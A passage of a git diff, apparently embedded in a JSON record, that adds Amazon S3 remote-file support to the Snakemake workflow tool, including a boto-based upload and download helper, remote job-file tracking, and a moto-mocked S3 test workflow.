wildcards\n \n+def glob_wildcards_remote(pattern, provider=S3, additional_kwargs=None):\n+    additional_kwargs = additional_kwargs if additional_kwargs else {}\n+    referenceObj = IOFile(remote(pattern, provider=provider, **additional_kwargs))\n+    key_list = [k.name for k in referenceObj._remote_object.list] \n+\n+    pattern = \".\/\"+ referenceObj._remote_object.name\n+    pattern = os.path.normpath(pattern)\n+    first_wildcard = re.search(\"{[^{]\", pattern)\n+    dirname = os.path.dirname(pattern[:first_wildcard.start(\n+    )]) if first_wildcard else os.path.dirname(pattern)\n+    if not dirname:\n+        dirname = \".\"\n+\n+    names = [match.group('name')\n+             for match in _wildcard_regex.finditer(pattern)]\n+    Wildcards = namedtuple(\"Wildcards\", names)\n+    wildcards = Wildcards(*[list() for name in names])\n+\n+    pattern = re.compile(regex(pattern))\n+    for f in key_list:\n+        match = re.match(pattern, f)\n+        if match:\n+            for name, value in match.groupdict().items():\n+                getattr(wildcards, name).append(value)\n+    return wildcards\n \n # TODO rewrite Namedlist!\n class Namedlist(list):\ndiff --git a\/snakemake\/jobs.py b\/snakemake\/jobs.py\nindex fdba8b5..317c7c4 100644\n--- a\/snakemake\/jobs.py\n+++ b\/snakemake\/jobs.py\n@@ -13,7 +13,7 @@\n from functools import partial\n from operator import attrgetter\n \n-from snakemake.io import IOFile, Wildcards, Resources, _IOFile\n+from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard\n from snakemake.utils import format, listfiles\n from snakemake.exceptions import RuleException, ProtectedOutputException\n from snakemake.exceptions import UnexpectedOutputException\n@@ -131,7 +131,40 @@ def expanded_output(self):\n                 if not expansion:\n                     yield f_\n                 for f, _ in expansion:\n-                    yield IOFile(f, self.rule)\n+                    fileToYield = IOFile(f, self.rule)\n+\n+                    fileToYield.clone_flags(f_)\n+\n+                    yield fileToYield\n+            else:\n+                yield f\n+\n+    @property\n+    def expanded_input(self):\n+        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"\n+\n+        for f, f_ in zip(self.input, self.rule.input):\n+            if not type(f_).__name__ == \"function\":\n+                if type(f_.file).__name__ not in [\"str\", \"function\"]:\n+                    if contains_wildcard(f_):\n+\n+                        expansion = self.expand_dynamic(\n+                            f_,\n+                            restriction=self.wildcards,\n+                            omit_value=_IOFile.dynamic_fill)\n+                        if not expansion:\n+                            yield f_\n+                        for f, _ in expansion:\n+\n+                            fileToYield = IOFile(f, self.rule)\n+\n+                            fileToYield.clone_flags(f_)\n+\n+                            yield fileToYield\n+                    else:\n+                        yield f\n+                else:\n+                    yield f\n             else:\n                 yield f\n \n@@ -159,6 +192,34 @@ def missing_input(self):\n         return set(f for f in self.input\n                    if not f.exists and not f in self.subworkflow_input)\n \n+\n+    @property\n+    def present_remote_input(self):\n+        files = set()\n+\n+        for f in self.input:\n+            if f.is_remote:\n+                if f.exists_remote:\n+                    files.add(f)\n+        return files\n+    \n+    @property\n+    def present_remote_output(self):\n+        files = set()\n+\n+        for f in self.remote_output:\n+            if f.exists_remote:\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def missing_remote_input(self):\n+        return self.remote_input - self.present_remote_input\n+\n+    @property\n+    def missing_remote_output(self):\n+        return self.remote_output - self.present_remote_output\n+\n     @property\n     def output_mintime(self):\n         \"\"\" Return oldest output file. \"\"\"\n@@ -197,6 +258,74 @@ def missing_output(self, requested=None):\n                     files.add(f)\n         return files\n \n+\n+    @property\n+    def remote_input(self):\n+        for f in self.input:\n+            if f.is_remote:\n+                yield f\n+\n+    @property\n+    def remote_output(self):\n+        for f in self.output:\n+            if f.is_remote:\n+                yield f\n+\n+    @property\n+    def remote_input_newer_than_local(self):\n+        files = set()\n+        for f in self.remote_input:\n+            if (f.exists_remote and f.exists_local) and (f.mtime > f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def remote_input_older_than_local(self):\n+        files = set()\n+        for f in self.remote_input:\n+            if (f.exists_remote and f.exists_local) and (f.mtime < f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def remote_output_newer_than_local(self):\n+        files = set()\n+        for f in self.remote_output:\n+            if (f.exists_remote and f.exists_local) and (f.mtime > f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def remote_output_older_than_local(self):\n+        files = set()\n+        for f in self.remote_output:\n+            if (f.exists_remote and f.exists_local) and (f.mtime < f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    def transfer_updated_files(self):\n+        for f in self.remote_output_older_than_local | self.remote_input_older_than_local:\n+            f.upload_to_remote()\n+\n+        for f in self.remote_output_newer_than_local | self.remote_input_newer_than_local:\n+            f.download_from_remote()\n+    \n+    @property\n+    def files_to_download(self):\n+        toDownload = set()\n+\n+        for f in self.input:\n+            if f.is_remote:\n+                if not f.exists_local and f.exists_remote:\n+                    toDownload.add(f)\n+\n+        toDownload = toDownload | self.remote_input_newer_than_local\n+        return toDownload\n+\n+    @property\n+    def files_to_upload(self):\n+        return self.missing_remote_input & self.remote_input_older_than_local\n+\n     @property\n     def existing_output(self):\n         return filter(lambda f: f.exists, self.expanded_output)\n@@ -231,6 +360,10 @@ def prepare(self):\n                 os.remove(f)\n         for f, f_ in zip(self.output, self.rule.output):\n             f.prepare()\n+\n+        for f in self.files_to_download:\n+            f.download_from_remote()\n+\n         for f in self.log:\n             f.prepare()\n         if self.benchmark:\n@@ -239,6 +372,8 @@ def prepare(self):\n     def cleanup(self):\n         \"\"\" Cleanup output files. \"\"\"\n         to_remove = [f for f in self.expanded_output if f.exists]\n+\n+        to_remove.extend([f for f in self.remote_input if f.exists])\n         if to_remove:\n             logger.info(\"Removing output files of failed job {}\"\n                         \" since they might be corrupted:\\n{}\".format(\n@@ -246,6 +381,23 @@ def cleanup(self):\n             for f in to_remove:\n                 f.remove()\n \n+            self.rmdir_empty_remote_dirs()\n+\n+    @property\n+    def empty_remote_dirs(self):\n+        remote_files = [f for f in (set(self.output) | set(self.input)) if f.is_remote]\n+        emptyDirsToRemove = set(os.path.dirname(f) for f in remote_files if not len(os.listdir(os.path.dirname(f))))\n+        return emptyDirsToRemove\n+\n+    def rmdir_empty_remote_dirs(self):\n+        for d in self.empty_remote_dirs:\n+            pathToDel = d\n+            while len(pathToDel) > 0 and len(os.listdir(pathToDel)) == 0:\n+                logger.info(\"rmdir empty dir: {}\".format(pathToDel))\n+                os.rmdir(pathToDel)\n+                pathToDel = os.path.dirname(pathToDel)\n+\n+\n     def format_wildcards(self, string, **variables):\n         \"\"\" Format a string with variables from the job. \"\"\"\n         _variables = dict()\ndiff --git a\/snakemake\/remote_providers\/RemoteObjectProvider.py b\/snakemake\/remote_providers\/RemoteObjectProvider.py\nnew file mode 100644\nindex 0000000..b040e87\n--- \/dev\/null\n+++ b\/snakemake\/remote_providers\/RemoteObjectProvider.py\n@@ -0,0 +1,50 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+from abc import ABCMeta, abstractmethod\n+\n+\n+class RemoteObject:\n+    \"\"\" This is an abstract class to be used to derive remote object classes for \n+        different cloud storage providers. For example, there could be classes for interacting with \n+        Amazon AWS S3 and Google Cloud Storage, both derived from this common base class.\n+    \"\"\"\n+    __metaclass__ = ABCMeta\n+\n+    def __init__(self, ioFile):\n+        self._iofile = ioFile\n+        self._file = ioFile._file\n+\n+    @abstractmethod\n+    def file(self):\n+        pass\n+\n+    @abstractmethod\n+    def exists(self):\n+        pass\n+\n+    @abstractmethod\n+    def mtime(self):\n+        pass\n+\n+    @abstractmethod\n+    def size(self):\n+        pass\n+\n+    @abstractmethod\n+    def download(self, *args, **kwargs):\n+        pass\n+\n+    @abstractmethod\n+    def upload(self, *args, **kwargs):\n+        pass\n+\n+    @abstractmethod\n+    def list(self, *args, **kwargs):\n+        pass\n+\n+    @abstractmethod\n+    def name(self, *args, **kwargs):\n+        pass\ndiff --git a\/snakemake\/remote_providers\/S3.py b\/snakemake\/remote_providers\/S3.py\nnew file mode 100644\nindex 0000000..77b15ea\n--- \/dev\/null\n+++ b\/snakemake\/remote_providers\/S3.py\n@@ -0,0 +1,90 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+import re\n+\n+from snakemake.remote_providers.RemoteObjectProvider import RemoteObject\n+from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n+from snakemake.remote_providers.implementations.S3 import S3Helper\n+from snakemake.decorators import memoize\n+\n+import boto\n+\n+\n+class RemoteObject(RemoteObject):\n+    \"\"\" This is a class to interact with the AWS S3 object store.\n+    \"\"\"\n+\n+    def __init__(self, *args, **kwargs):\n+        super(RemoteObject, self).__init__(*args, **kwargs)\n+\n+        # pass all args but the first, which is the ioFile\n+        self._s3c = S3Helper(*args[1:], **kwargs)\n+\n+    # === Implementations of abstract class members ===\n+\n+    def file(self):\n+        return self._file\n+\n+    def exists(self):\n+        if self._matched_s3_path:\n+            return self._s3c.exists_in_bucket(self.s3_bucket, self.s3_key)\n+        else:\n+            raise S3FileException(\"The file cannot be parsed as an s3 path in form 'bucket\/key': %s\" % self.file())\n+\n+    def mtime(self):\n+        if self.exists():\n+            return self._s3c.key_last_modified(self.s3_bucket, self.s3_key)\n+        else:\n+            raise S3FileException(\"The file does not seem to exist remotely: %s\" % self.file())\n+\n+    def size(self):\n+        if self.exists():\n+            return self._s3c.key_size(self.s3_bucket, self.s3_key)\n+        else:\n+            return self._iofile.size_local\n+\n+    def download(self):\n+        self._s3c.download_from_s3(self.s3_bucket, self.s3_key, self.file())\n+\n+    def upload(self):\n+        conn = boto.connect_s3()\n+        if self.size() > 5000:\n+            self._s3c.upload_to_s3_multipart(self.s3_bucket, self.file(), self.s3_key)\n+        else:\n+            self._s3c.upload_to_s3(self.s3_bucket, self.file(), self.s3_key)\n+\n+    @property\n+    def list(self):\n+        return self._s3c.list_keys(self.s3_bucket)\n+\n+    # === Related methods ===\n+\n+    @property\n+    def _matched_s3_path(self):\n+        return re.search(\"(?P<bucket>[^\/]*)\/(?P<key>.*)\", self.file())\n+\n+    @property\n+    def s3_bucket(self):\n+        if len(self._matched_s3_path.groups()) == 2:\n+            return self._matched_s3_path.group(\"bucket\")\n+        return None\n+\n+    @property\n+    def name(self):\n+        return self.s3_key\n+\n+    @property\n+    def s3_key(self):\n+        if len(self._matched_s3_path.groups()) == 2:\n+            return self._matched_s3_path.group(\"key\")\n+\n+    def s3_create_stub(self):\n+        if self._matched_s3_path:\n+            if not self.exists:\n+                self._s3c.download_from_s3(self.s3_bucket, self.s3_key, self.file, createStubOnly=True)\n+        else:\n+            raise S3FileException(\"The file to be downloaded cannot be parsed as an s3 path in form 'bucket\/key': %s\" %\n+                                  self.file())\ndiff --git a\/snakemake\/remote_providers\/__init__.py b\/snakemake\/remote_providers\/__init__.py\nnew file mode 100644\nindex 0000000..8b13789\n--- \/dev\/null\n+++ b\/snakemake\/remote_providers\/__init__.py\n@@ -0,0 +1 @@\n+\ndiff --git a\/snakemake\/remote_providers\/implementations\/S3.py b\/snakemake\/remote_providers\/implementations\/S3.py\nnew file mode 100644\nindex 0000000..c6cb622\n--- \/dev\/null\n+++ b\/snakemake\/remote_providers\/implementations\/S3.py\n@@ -0,0 +1,341 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+# built-ins\n+import os\n+import math\n+import time\n+import email.utils\n+from time import mktime\n+import datetime\n+from multiprocessing import Pool\n+\n+# third-party modules\n+import boto\n+from boto.s3.key import Key\n+from filechunkio import FileChunkIO\n+\n+\n+class S3Helper(object):\n+\n+    def __init__(self, *args, **kwargs):\n+        # as per boto, expects the environment variables to be set:\n+        # AWS_ACCESS_KEY_ID\n+        # AWS_SECRET_ACCESS_KEY\n+        # Otherwise these values need to be passed in as kwargs\n+        self.conn = boto.connect_s3(*args, **kwargs)\n+\n+    def upload_to_s3(\n+            self,\n+            bucketName,\n+            filePath,\n+            key=None,\n+            useRelativePathForKey=True,\n+            relativeStartDir=None,\n+            replace=False,\n+            reduced_redundancy=False,\n+            headers=None):\n+        \"\"\" Upload a file to S3\n+\n+            This function uploads a file to an AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                filePath: The path to the file to upload.\n+                key: The key to set for the file on S3. If not specified, this will default to the\n+                    name of the file.\n+                useRelativePathForKey: If set to True (default), and key is None, the S3 key will include slashes\n+                    representing the path of the file relative to the CWD. If False only the\n+                    file basename will be used for the key.\n+                relativeStartDir: The start dir to use for useRelativePathForKey. No effect if key is set.\n+                replace: If True a file with the same key will be replaced with the one being written\n+                reduced_redundancy: Sets the file to AWS reduced redundancy storage.\n+                headers: additional heads to pass to AWS\n+\n+            Returns: The key of the file on S3 if written, None otherwise\n+        \"\"\"\n+        filePath = os.path.realpath(os.path.expanduser(filePath))\n+\n+        assert bucketName, \"bucketName must be specified\"\n+        assert os.path.exists(filePath), \"The file path specified does not exist: %s\" % filePath\n+        assert os.path.isfile(filePath), \"The file path specified does not appear to be a file: %s\" % filePath\n+\n+        try:\n+            b = self.conn.get_bucket(bucketName)\n+        except:\n+            b = self.conn.create_bucket(bucketName)\n+\n+        k = Key(b)\n+\n+        if key:\n+            k.key = key\n+        else:\n+            if useRelativePathForKey:\n+                if relativeStartDir:\n+                    pathKey = os.path.relpath(filePath, relativeStartDir)\n+                else:\n+                    pathKey = os.path.relpath(filePath)\n+            else:\n+                pathKey = os.path.basename(filePath)\n+            k.key = pathKey\n+        try:\n+            bytesWritten = k.set_contents_from_filename(\n+                filePath,\n+                replace=replace,\n+                reduced_redundancy=reduced_redundancy,\n+                headers=headers)\n+            if bytesWritten:\n+                return k.key\n+            else:\n+                return None\n+        except:\n+            return None\n+\n+    def download_from_s3(\n+            self,\n+            bucketName,\n+            key,\n+            destinationPath=None,\n+            expandKeyIntoDirs=True,\n+            makeDestDirs=True,\n+            headers=None, createStubOnly=False):\n+        \"\"\" Download a file from s3\n+\n+            This function downloads an object from a specified AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                destinationPath: If specified, the file will be saved to this path, otherwise cwd.\n+                expandKeyIntoDirs: Since S3 keys can include slashes, if this is True (defult)\n+                    then S3 keys with slashes are expanded into directories on the receiving end.\n+                    If it is False, the key is passed to os.path.basename() to get the substring\n+                    following the last slash.\n+                makeDestDirs: If this is True (default) and the destination path includes directories\n+                    that do not exist, they will be created.\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                The destination path of the downloaded file on the receiving end, or None if the filePath\n+                could not be downloaded\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = Key(b)\n+\n+        if destinationPath:\n+            destinationPath = os.path.realpath(os.path.expanduser(destinationPath))\n+        else:\n+            if expandKeyIntoDirs:\n+                destinationPath = os.path.join(os.getcwd(), key)\n+            else:\n+                destinationPath = os.path.join(os.getcwd(), os.path.basename(key))\n+\n+        # if the destination path does not exist\n+        if not os.path.exists(os.path.dirname(destinationPath)) and makeDestDirs:\n+            os.makedirs(os.path.dirname(destinationPath))\n+\n+        k.key = key if key else os.path.basename(filePath)\n+\n+        try:\n+            if not createStubOnly:\n+                k.get_contents_to_filename(destinationPath, headers=headers)\n+            else:\n+                # just create an empty file with the right timestamps\n+                with open(destinationPath, 'wb') as fp:\n+                    modified_tuple = email.utils.parsedate_tz(k.last_modified)\n+                    modified_stamp = int(email.utils.mktime_tz(modified_tuple))\n+                    os.utime(fp.name, (modified_stamp, modified_stamp))\n+            return destinationPath\n+        except:\n+            return None\n+\n+    def _upload_part(self, bucketName, multipart_id, part_num, source_path, offset, bytesToWrite, numberOfRetries=5):\n+\n+        def _upload(retriesRemaining=numberOfRetries):\n+            try:\n+                b = self.conn.get_bucket(bucketName)\n+                for mp in b.get_all_multipart_uploads():\n+                    if mp.id == multipart_id:\n+                        with FileChunkIO(source_path, 'r', offset=offset, bytes=bytesToWrite) as fp:\n+                            mp.upload_part_from_file(fp=fp, part_num=part_num)\n+                        break\n+            except Exception() as e:\n+                if retriesRemaining:\n+                    _upload(retriesRemaining=retriesRemaining - 1)\n+                else:\n+                    raise e\n+\n+        _upload()\n+\n+    def upload_to_s3_multipart(\n+            self,\n+            bucketName,\n+            filePath,\n+            key=None,\n+            useRelativePathForKey=True,\n+            relativeStartDir=None,\n+            replace=False,\n+            reduced_redundancy=False,\n+            headers=None,\n+            parallel_processes=4):\n+        \"\"\" Upload a file to S3\n+\n+            This function uploads a file to an AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                filePath: The path to the file to upload.\n+                key: The key to set for the file on S3. If not specified, this will default to the\n+                    name of the file.\n+                useRelativePathForKey: If set to True (default), and key is None, the S3 key will include slashes\n+                    representing the path of the file relative to the CWD. If False only the\n+                    file basename will be used for the key.\n+                relativeStartDir: The start dir to use for useRelativePathForKey. No effect if key is set.\n+                replace: If True a file with the same key will be replaced with the one being written\n+                reduced_redundancy: Sets the file to AWS reduced redundancy storage.\n+                headers: additional heads to pass to AWS\n+                parallel_processes: Number of concurrent uploads\n+\n+            Returns: The key of the file on S3 if written, None otherwise\n+        \"\"\"\n+        filePath = os.path.realpath(os.path.expanduser(filePath))\n+\n+        assert bucketName, \"bucketName must be specified\"\n+        assert os.path.exists(filePath), \"The file path specified does not exist: %s\" % filePath\n+        assert os.path.isfile(filePath), \"The file path specified does not appear to be a file: %s\" % filePath\n+\n+        try:\n+            b = self.conn.get_bucket(bucketName)\n+        except:\n+            b = self.conn.create_bucket(bucketName)\n+\n+        pathKey = None\n+        if key:\n+            pathKey = key\n+        else:\n+            if useRelativePathForKey:\n+                if relativeStartDir:\n+                    pathKey = os.path.relpath(filePath, relativeStartDir)\n+                else:\n+                    pathKey = os.path.relpath(filePath)\n+            else:\n+                pathKey = os.path.basename(filePath)\n+\n+        mp = b.initiate_multipart_upload(pathKey, headers=headers)\n+\n+        sourceSize = os.stat(filePath).st_size\n+\n+        bytesPerChunk = 52428800  # 50MB = 50 * 1024 * 1024\n+        chunkCount = int(math.ceil(sourceSize \/ float(bytesPerChunk)))\n+\n+        pool = Pool(processes=parallel_processes)\n+        for i in range(chunkCount):\n+            offset = i * bytesPerChunk\n+            remainingBytes = sourceSize - offset\n+            bytesToWrite = min([bytesPerChunk, remainingBytes])\n+            partNum = i + 1\n+            pool.apply_async(self._upload_part, [bucketName, mp.id, partNum, filePath, offset, bytesToWrite])\n+        pool.close()\n+        pool.join()\n+\n+        if len(mp.get_all_parts()) == chunkCount:\n+            mp.complete_upload()\n+            try:\n+                key = b.get_key(pathKey)\n+                return key.key\n+            except:\n+                return None\n+        else:\n+            mp.cancel_upload()\n+            return None\n+\n+    def delete_from_bucket(self, bucketName, key, headers=None):\n+        \"\"\" Delete a file from s3\n+\n+            This function deletes an object from a specified AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                The name of the object deleted\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = Key(b)\n+        k.key = key\n+        ret = k.delete(headers=headers)\n+        return ret.name\n+\n+    def exists_in_bucket(self, bucketName, key, headers=None):\n+        \"\"\" Returns whether the key exists in the bucket\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                True | False\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = Key(b)\n+        k.key = key\n+        return k.exists(headers=headers)\n+\n+    def key_size(self, bucketName, key, headers=None):\n+        \"\"\" Returns the size of a key based on a HEAD request\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                Size in kb\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = b.lookup(key)\n+\n+        return k.size\n+\n+    def key_last_modified(self, bucketName, key, headers=None):\n+        \"\"\" Returns a timestamp of a key based on a HEAD request\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                timestamp\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = b.lookup(key)\n+\n+        # email.utils parsing of timestamp mirrors boto whereas\n+        # time.strptime() can have TZ issues due to DST\n+        modified_tuple = email.utils.parsedate_tz(k.last_modified)\n+        epochTime = int(email.utils.mktime_tz(modified_tuple))\n+\n+        return epochTime\n+\n+    def list_keys(self, bucketName):\n+        return self.conn.get_bucket(bucketName).list()\ndiff --git a\/snakemake\/rules.py b\/snakemake\/rules.py\nindex 3608167..5324eeb 100644\n--- a\/snakemake\/rules.py\n+++ b\/snakemake\/rules.py\n@@ -95,7 +95,12 @@ def get_io(rule):\n             if f in dynamic_io:\n                 try:\n                     for e in reversed(expand(f, zip, **wildcards)):\n-                        expansion[i].append(IOFile(e, rule=branch))\n+                        # need to clone the flags so intermediate\n+                        # dynamic remote file paths are expanded and \n+                        # removed appropriately\n+                        ioFile = IOFile(e, rule=branch)\n+                        ioFile.clone_flags(f)\n+                        expansion[i].append(ioFile)\n                 except KeyError:\n                     return None\n \ndiff --git a\/snakemake\/workflow.py b\/snakemake\/workflow.py\nindex b035bc3..833bd90 100644\n--- a\/snakemake\/workflow.py\n+++ b\/snakemake\/workflow.py\n@@ -23,7 +23,7 @@\n from snakemake.scheduler import JobScheduler\n from snakemake.parser import parse\n import snakemake.io\n-from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\n+from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch\n from snakemake.persistence import Persistence\n from snakemake.utils import update_config\n \ndiff --git a\/tests\/test_remote\/S3Mocked.py b\/tests\/test_remote\/S3Mocked.py\nnew file mode 100644\nindex 0000000..d8cc489\n--- \/dev\/null\n+++ b\/tests\/test_remote\/S3Mocked.py\n@@ -0,0 +1,103 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+# built-ins\n+import os, sys\n+from contextlib import contextmanager\n+import pickle\n+import time\n+import threading\n+\n+# third-party\n+import boto\n+from moto import mock_s3\n+\n+# intra-module\n+from snakemake.remote_providers.S3 import RemoteObject as S3RemoteObject\n+from snakemake.remote_providers.implementations.S3 import S3Helper\n+from snakemake.decorators import decAllMethods\n+\n+def noop():\n+    pass\n+\n+def pickledMotoWrapper(func):\n+    \"\"\"\n+        This is a class decorator that in turn decorates all methods within\n+        a class to mock out boto calls with moto-simulated ones.\n+        Since the moto backends are not presistent across calls by default, \n+        the wrapper also pickles the bucket state after each function call,\n+        and restores it before execution. This way uploaded files are available\n+        for follow-on tasks. Since snakemake may execute with multiple threads\n+        it also waits for the pickled bucket state file to be available before\n+        loading it in. This is a hackey alternative to using proper locks,\n+        but works ok in practice.\n+    \"\"\"\n+    def wrapper_func(self, *args, **kwargs):\n+        motoContextFile = \"motoState.p\"\n+\n+        motoContext = mock_s3()\n+\n+        # load moto buckets from pickle\n+        if os.path.isfile(motoContextFile) and os.path.getsize(motoContextFile) > 0:\n+            with file_lock(motoContextFile):\n+                with open( motoContextFile, \"rb\" ) as f:\n+                    motoContext.backends[\"global\"].buckets = pickle.load( f )\n+\n+        motoContext.backends[\"global\"].reset = noop\n+\n+        mockedFunction = motoContext(func)\n+\n+        retval = mockedFunction(self, *args, **kwargs)\n+\n+        with file_lock(motoContextFile):\n+            with open( motoContextFile, \"wb\" ) as f:\n+                pickle.dump(motoContext.backends[\"global\"].buckets, f)\n+\n+        return retval\n+    return wrapper_func\n+\n+@decAllMethods(pickledMotoWrapper, prefix=None)\n+class RemoteObject(S3RemoteObject):\n+    \"\"\" \n+        This is a derivative of the S3 remote provider that mocks\n+        out boto-based S3 calls using the \"moto\" Python package.\n+        Only the initializer is different; it \"uploads\" the input \n+        test file to the moto-simulated bucket at the start.\n+    \"\"\"\n+\n+    def __init__(self, *args, **kwargs):\n+        bucketName = 'test-remote-bucket'\n+        testFile = \"test.txt\"\n+\n+        conn = boto.connect_s3()\n+        if bucketName not in [b.name for b in conn.get_all_buckets()]:\n+            conn.create_bucket(bucketName)\n+\n+        # \"Upload\" files that should be in S3 before tests...\n+        s3c = S3Helper()\n+        if not s3c.exists_in_bucket(bucketName, testFile):\n+            s3c.upload_to_s3(bucketName, testFile)\n+\n+        return super(RemoteObject, self).__init__(*args, **kwargs)\n+\n+\n+# ====== Helpers =====\n+\n+@contextmanager\n+def file_lock(filepath):\n+    lock_file = filepath + \".lock\"\n+\n+    while os.path.isfile(lock_file):\n+        time.sleep(0.1)\n+\n+    with open(lock_file, 'w') as f:\n+        f.write(\"1\")\n+\n+    try:\n+        yield\n+    finally:\n+        if os.path.isfile(lock_file):\n+            os.remove(lock_file)\n+\ndiff --git a\/tests\/test_remote\/Snakefile b\/tests\/test_remote\/Snakefile\nnew file mode 100644\nindex 0000000..b2e1298\n--- \/dev\/null\n+++ b\/tests\/test_remote\/Snakefile\n@@ -0,0 +1,49 @@\n+import re, os, sys\n+\n+import S3Mocked as S3Mocked\n+\n+#remote dynamic file test\n+\n+# This makes use of a special provider that mocks up S3 using the moto\n+# library so that boto calls hit local \"buckets\"\n+\n+rule all:\n+    input:\n+        # only keeping the file so we can copy it out to the cwd\n+        remote(\"test-remote-bucket\/out.txt\", keep=True, provider=S3Mocked, additional_kwargs={})\n+    run:\n+        shell(\"mv test-remote-bucket\/out.txt .\/\")\n+\n+rule split:\n+    input: remote('test-remote-bucket\/test.txt', keep=False, provider=S3Mocked, additional_kwargs={})\n+    output: remote(dynamic('test-remote-bucket\/prefix{split_id}.txt'), provider=S3Mocked, additional_kwargs={})\n+    run:\n+        shell('split -l 2 {input} test-remote-bucket\/prefix')\n+        for f in os.listdir(os.getcwd()+\"\/test-remote-bucket\"):\n+            if re.search('prefix[a-z][a-z]', f):\n+                os.rename(\"test-remote-bucket\/\"+f, \"test-remote-bucket\/\"+f + '.txt')\n+\n+rule cut:\n+    input: remote('test-remote-bucket\/prefix{split_id,[a-z][a-z]}.txt', provider=S3Mocked, additional_kwargs={})\n+    output: \n+        remote('test-remote-bucket\/{split_id}_cut.txt', provider=S3Mocked, additional_kwargs={})\n+    shell: 'cut -f 1,2 {input} > {output}'\n+\n+rule merge:\n+    input: \n+        remote(dynamic('test-remote-bucket\/{split_id}_cut.txt'), provider=S3Mocked, additional_kwargs={})\n+    output: \n+        remote('test-remote-bucket\/out.txt', provider=S3Mocked, additional_kwargs={}),\n+    run: \n+        shell('echo {input}; cat {input} > {output}')\n+\n+\n+# after we finish, we need to remove the pickle storing\n+# the local moto \"buckets\" so we are starting fresh\n+# next time this test is run. This file is created by\n+# the moto wrapper defined in S3Mocked.py\n+onsuccess:\n+    shell(\"rm .\/motoState.p\")\n+\n+onerror:\n+    shell(\"rm .\/motoState.p\")\n\\ No newline at end of file\ndiff --git a\/tests\/test_benchmark\/expected-results\/test.benchmark.json b\/tests\/test_remote\/__init__.py\nsimilarity index 100%\nrename from tests\/test_benchmark\/expected-results\/test.benchmark.json\nrename to tests\/test_remote\/__init__.py\ndiff --git a\/tests\/test_remote\/expected-results\/out.txt b\/tests\/test_remote\/expected-results\/out.txt\nnew file mode 100644\nindex 0000000..818b3c5\n--- \/dev\/null\n+++ b\/tests\/test_remote\/expected-results\/out.txt\n@@ -0,0 +1,4 @@\n+0       1       2\n+0       1       2\n+0       1       2\n+0       1       2\ndiff --git a\/tests\/test_remote\/test.txt b\/tests\/test_remote\/test.txt\nnew file mode 100644\nindex 0000000..818b3c5\n--- \/dev\/null\n+++ b\/tests\/test_remote\/test.txt\n@@ -0,0 +1,4 @@\n+0       1       2\n+0       1       2\n+0       1       2\n+0       1       2\ndiff --git a\/tests\/tests.py b\/tests\/tests.py\nold mode 100644\nnew mode 100755\nindex 37dd180..6b53573\n--- a\/tests\/tests.py\n+++ b\/tests\/tests.py\n@@ -265,6 +265,9 @@ def test_multiple_includes():\n def test_yaml_config():\n     run(dpath(\"test_yaml_config\"))\n \n+def test_remote():\n+   run(dpath(\"test_remote\"))\n+\n \n def test_cluster_sync():\n     run(dpath(\"test14\"),\n","files":{"\/snakemake\/dag.py":{"changes":[{"diff":"\n from functools import partial, lru_cache\n from operator import itemgetter, attrgetter\n \n-from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files\n+from snakemake.io import IOFile, _IOFile, 